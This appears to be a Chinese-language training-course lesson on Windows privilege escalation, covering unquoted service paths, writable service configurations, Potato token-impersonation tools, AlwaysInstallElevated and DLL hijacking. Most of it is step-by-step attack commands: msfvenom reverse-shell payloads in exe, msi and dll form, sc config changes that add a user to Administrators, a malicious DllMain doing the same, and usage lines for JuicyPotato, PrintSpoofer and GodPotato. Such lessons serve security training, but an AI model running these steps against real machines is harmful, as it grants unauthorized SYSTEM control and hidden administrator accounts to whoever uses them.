---
title: Day056：Windows 提权 - 服务配置与令牌权限利用
tags:
  - 网络安全
  - Windows提权
  - 服务提权
  - 令牌模拟
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d056
date: 2026-03-19
updated: 2026-01-28
---

# Day056：Windows 提权 - 服务配置与令牌权限利用

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 9：系统提权入门 |
| **今日主题** | 服务配置错误与令牌权限滥用 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶+ |

---

## 今日痛点场景

> **场景**：在昨天的枚举中，你发现了一个服务路径没有加引号，还发现当前用户有 `SeImpersonatePrivilege` 权限。这两个能用来提权吗？
>
> **问题**：如何利用服务配置错误和令牌权限获取 SYSTEM 权限？
>
> **今天的任务**：深入学习 Windows 服务提权和令牌模拟技术——这是 Windows 提权最常用的两种方式。

---

## 今日目标

- [ ] 掌握未引用服务路径提权
- [ ] 学会服务权限滥用
- [ ] 理解令牌模拟技术（Potato 系列）
- [ ] 完成 Windows 提权实战

**闯关条件**：通过服务配置错误或令牌权限成功提权到 SYSTEM。

---

## 实战任务（先动手！）

### 任务 1：未引用服务路径提权（45 分钟）

**漏洞原理**：
```
服务路径如果包含空格且未加引号，Windows 会按顺序尝试解析：

路径：C:\Program Files\Some Service\service.exe

Windows 解析顺序：
1. C:\Program.exe
2. C:\Program Files\Some.exe
3. C:\Program Files\Some Service\service.exe

如果你能在这些位置放置恶意程序，服务启动时会执行它！
```

**查找未引用路径**：
```cmd
:: 方法 1：wmic
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

:: 方法 2：PowerShell
Get-WmiObject win32_service | Select-Object Name, DisplayName, PathName, StartMode | Where-Object {$_.PathName -notlike "*`"*" -and $_.PathName -like "* *"}
```

**检查目录权限**：
```cmd
:: 使用 icacls 检查权限
icacls "C:\Program Files"
icacls "C:\Program Files\Some Service"

:: 关键权限
:: (W) = Write 写权限
:: (F) = Full Control 完全控制
:: BUILTIN\Users:(W) = 普通用户可写
```

**利用步骤**：
```cmd
:: 1. 发现未引用路径
wmic service get name,pathname | findstr /i /v "C:\Windows"

:: 发现：C:\Program Files\Vulnerable Service\service.exe

:: 2. 检查可写目录
icacls "C:\Program Files\Vulnerable Service"
:: 结果：BUILTIN\Users:(W)

:: 3. 创建恶意程序
:: 使用 msfvenom 生成
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > Vulnerable.exe

:: 4. 放置恶意程序
copy Vulnerable.exe "C:\Program Files\Vulnerable.exe"

:: 5. 重启服务
sc stop "VulnerableService"
sc start "VulnerableService"

:: 或等待系统重启
```

**PowerUp 自动化**：
```powershell
# 导入 PowerUp
. .\PowerUp.ps1

# 查找未引用路径
Get-ServiceUnquoted

# 自动利用
Write-ServiceBinary -ServiceName 'VulnerableService' -Path 'C:\Program Files\Vulnerable.exe'
```

**记录**：
```
发现的未引用路径：________________
可写目录：________________
```

---

### 任务 2：服务权限滥用（40 分钟）

**服务权限类型**：
```
服务配置权限：
- SERVICE_CHANGE_CONFIG：可以修改服务配置
- SERVICE_START：可以启动服务
- SERVICE_STOP：可以停止服务
- SERVICE_ALL_ACCESS：完全控制

如果普通用户有 SERVICE_CHANGE_CONFIG 权限，
可以修改服务执行的程序！
```

**检查服务权限**：
```cmd
:: 使用 accesschk（Sysinternals）
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
accesschk.exe -uwcqv "Everyone" *

:: 输出示例
VulnerableService
  SERVICE_QUERY_STATUS
  SERVICE_QUERY_CONFIG
  SERVICE_CHANGE_CONFIG  <-- 关键！
  SERVICE_START
  SERVICE_STOP
```

**利用服务配置权限**：
```cmd
:: 1. 发现可修改的服务
accesschk.exe -uwcqv "Users" * | findstr /i SERVICE_CHANGE_CONFIG

:: 2. 查看当前配置
sc qc VulnerableService

:: 3. 修改服务执行路径
sc config VulnerableService binPath= "C:\Windows\Temp\shell.exe"

:: 或添加用户
sc config VulnerableService binPath= "net localgroup Administrators user1 /add"

:: 4. 重启服务
sc stop VulnerableService
sc start VulnerableService
```

**可写服务文件**：
```cmd
:: 检查服务执行文件权限
icacls "C:\path\to\service.exe"

:: 如果可写
:: 替换为恶意程序
copy /y malicious.exe "C:\path\to\service.exe"

:: 重启服务
sc stop ServiceName
sc start ServiceName
```

**PowerUp 自动化**：
```powershell
# 查找可修改的服务
Get-ModifiableService

# 查找可修改的服务文件
Get-ModifiableServiceFile

# 利用
Invoke-ServiceAbuse -ServiceName 'VulnerableService' -UserName 'attacker' -Password 'P@ssw0rd!'
```

**记录**：
```
可修改的服务：________________
使用的利用方法：________________
```

---

### 任务 3：令牌权限滥用（50 分钟）

**关键令牌权限**：
```
SeImpersonatePrivilege：
- 允许模拟其他用户的令牌
- IIS、SQL Server 服务账户通常有此权限
- 可利用获取 SYSTEM

SeAssignPrimaryTokenPrivilege：
- 允许分配主令牌
- 类似 SeImpersonatePrivilege

SeDebugPrivilege：
- 允许调试任何进程
- 可以注入代码到 SYSTEM 进程
```

**检查令牌权限**：
```cmd
whoami /priv

:: 关键输出
PRIVILEGES INFORMATION
----------------------
SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

**Potato 系列攻击**：
```
JuicyPotato：
- 利用 COM 对象和本地 NTLM 认证
- 适用于 Windows 7/Server 2008 - Windows 10/Server 2019

PrintSpoofer：
- 利用打印机服务漏洞
- 适用于 Windows 10/Server 2016-2019

RoguePotato：
- JuicyPotato 的改进版
- 适用于更新的 Windows 版本

GodPotato：
- 最新的 Potato 变种
- 适用于 Windows 8.1-11/Server 2012-2022
```

**JuicyPotato 利用**：
```cmd
:: 检查权限
whoami /priv
:: 确认有 SeImpersonatePrivilege

:: 下载 JuicyPotato
:: https://github.com/ohpe/juicy-potato/releases

:: 利用
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\shell.exe" -t *

:: 参数说明
:: -l：本地监听端口
:: -p：要执行的程序
:: -a：程序参数
:: -t：令牌类型（* 表示都尝试）
```

**PrintSpoofer 利用**：
```cmd
:: 更简单的方法
:: https://github.com/itm4n/PrintSpoofer

:: 直接获取 SYSTEM shell
PrintSpoofer.exe -i -c cmd

:: 执行命令
PrintSpoofer.exe -c "whoami"
```

**GodPotato 利用**：
```cmd
:: 最新版本
:: https://github.com/BeichenDream/GodPotato

:: 执行命令
GodPotato.exe -cmd "whoami"

:: 获取 shell
GodPotato.exe -cmd "cmd /c C:\Windows\Temp\shell.exe"
```

**记录**：
```
拥有的令牌权限：________________
使用的 Potato 工具：________________
```

---

### 任务 4：AlwaysInstallElevated 提权（25 分钟）

**漏洞原理**：
```
如果启用了 AlwaysInstallElevated 策略，
任何用户安装 MSI 包时都会以 SYSTEM 权限运行。
```

**检查是否启用**：
```cmd
:: 两个注册表键都需要设置为 1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: 如果都返回 0x1，则可利用
```

**创建恶意 MSI**：
```bash
# 使用 msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi > shell.msi

# 或使用 PowerUp
Write-UserAddMSI
```

**安装恶意 MSI**：
```cmd
:: 静默安装
msiexec /quiet /qn /i C:\Windows\Temp\shell.msi
```

**PowerUp 自动化**：
```powershell
# 检查
Get-RegistryAlwaysInstallElevated

# 利用
Write-UserAddMSI
# 生成 UserAdd.msi，安装后添加管理员用户
```

**记录**：
```
AlwaysInstallElevated 状态：________________
```

---

### 任务 5：DLL 劫持（30 分钟）

**DLL 搜索顺序**：
```
1. 程序所在目录
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. 当前目录
6. PATH 环境变量中的目录

如果程序加载的 DLL 在搜索路径的可写目录中不存在，
可以放置恶意 DLL 被加载！
```

**查找 DLL 劫持机会**：
```cmd
:: 使用 Process Monitor
:: 过滤：
:: - Result = NAME NOT FOUND
:: - Path ends with .dll

:: 查看可写的 PATH 目录
echo %PATH%
icacls "C:\some\path"
```

**创建恶意 DLL**：
```c
// dllmain.c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("net localgroup Administrators user1 /add");
    }
    return TRUE;
}
```

**编译**：
```bash
# 使用 MinGW
x86_64-w64-mingw32-gcc dllmain.c -shared -o malicious.dll

# 或使用 msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll > malicious.dll
```

**记录**：
```
发现的 DLL 劫持机会：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 理解未引用服务路径 | 20 分 |
| 掌握服务权限滥用 | 20 分 |
| 成功 Potato 提权 | 30 分 |
| 理解 AlwaysInstallElevated | 15 分 |
| 了解 DLL 劫持 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### 服务提权原理

```
Windows 服务以 SYSTEM 身份运行
       ↓
如果能控制服务执行什么
       ↓
就能以 SYSTEM 身份执行代码
       ↓
提权成功！

控制方法：
1. 修改服务配置（binPath）
2. 替换服务文件
3. 利用路径解析漏洞
```

### 令牌模拟原理

```
SeImpersonatePrivilege 允许：
- 获取其他用户的令牌
- 使用该令牌执行操作

Potato 攻击原理：
1. 创建恶意 COM 服务器
2. 诱使 SYSTEM 账户连接
3. 捕获 SYSTEM 的令牌
4. 使用令牌执行命令
```

### 权限继承

```
服务 → 以 SYSTEM 运行
  ↓
服务执行的程序 → 继承 SYSTEM 权限
  ↓
程序创建的子进程 → 继承 SYSTEM 权限

所以只要让服务执行我们的代码，
就能获得 SYSTEM 权限！
```

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 服务无法重启 | 需要管理员权限 | 等待系统重启 |
| Potato 失败 | Windows 版本不支持 | 尝试其他 Potato 变种 |
| DLL 劫持失败 | 进程不加载该 DLL | 确认 DLL 名称和位置 |
| MSI 被阻止 | 组策略限制 | 尝试其他方法 |

---

## 知识卡片速查

### 服务提权速查

```cmd
:: 未引用路径
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

:: 服务权限
accesschk.exe -uwcqv "Users" *

:: 修改服务
sc config ServiceName binPath= "C:\Windows\Temp\shell.exe"
```

### Potato 速查

```cmd
:: 检查权限
whoami /priv

:: PrintSpoofer（推荐）
PrintSpoofer.exe -i -c cmd

:: JuicyPotato
JuicyPotato.exe -l 1337 -p cmd.exe -t *

:: GodPotato
GodPotato.exe -cmd "cmd"
```

### 常用工具

```
PowerUp.ps1 - 自动化检查和利用
accesschk.exe - 权限检查
PrintSpoofer.exe - 令牌模拟
JuicyPotato.exe - 令牌模拟（老版本）
GodPotato.exe - 令牌模拟（新版本）
```

---

## 常见问题

**Q1：JuicyPotato 在新版 Windows 上不工作？**

A1：
- 使用 PrintSpoofer 或 GodPotato
- 新版 Windows 修复了部分漏洞
- 检查系统版本选择合适工具

**Q2：服务修改后无法启动？**

A2：
- 检查 binPath 格式
- 程序可能有依赖
- 考虑使用批处理脚本

**Q3：没有 SeImpersonatePrivilege 怎么办？**

A3：
- 这个权限通常 IIS/SQL 服务有
- 寻找其他提权向量
- 检查是否有 SeDebugPrivilege

---

## 明日预告

**Day 057：Linux 内核漏洞利用入门**

明天你将：
- 了解内核漏洞利用基础
- 学习著名内核漏洞
- 完成内核提权实战

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 成功利用的服务 | |
| 使用的 Potato 工具 | |
| 今日收获 | |

---

> **导师点评**：
>
> Windows 服务提权是实战中最常见的提权方式之一。
>
> 未引用服务路径是个"经典"漏洞——Windows 的设计就是这样，只要路径有空格且没引号，就会按顺序解析。很多第三方软件都有这个问题。
>
> Potato 系列更是 Windows 提权的"神器"。只要有 SeImpersonatePrivilege，几乎就等于有 SYSTEM 权限。这也是为什么安全建议不要给服务账户这个权限——但 IIS、SQL Server 默认就有。
>
> **记住：Windows 提权的核心是"找到能以高权限执行代码的机会"。服务和令牌，就是两个最好的机会**。

```bash
echo "Day 056 Complete! Windows 服务/令牌提权高手！"
```
